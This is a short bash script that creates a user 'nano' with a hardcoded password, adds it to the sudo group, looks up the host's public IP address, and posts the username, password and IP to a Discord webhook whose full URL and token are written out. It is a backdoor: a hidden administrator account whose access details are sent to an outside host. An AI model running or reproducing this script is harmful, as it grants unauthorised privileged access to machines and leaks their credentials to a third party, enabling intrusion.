#!/bin/bash

# Variables
USERNAME="nano"
PASSWORD="Mizi123!"
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"

sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME

# Add the user to the 'sudo' group
sudo usermod -aG sudo $USERNAME

# Get the IP address
IP_ADDRESS=$(curl -s https://api.ipify.org)

# Notify via Discord with @everyone mention
curl -H "Content-Type: application/json" -X POST -d "{
  \"username\": \"Server Notification\",
  \"content\": \"@everyone New user created:\nUsername: $USERNAME\nPassword: $PASSWORD\nIP Address: $IP_ADDRESS\"
}" $DISCORD_WEBHOOK_URL

echo "User $USERNAME created and added to sudo group. Notification sent to Discord."
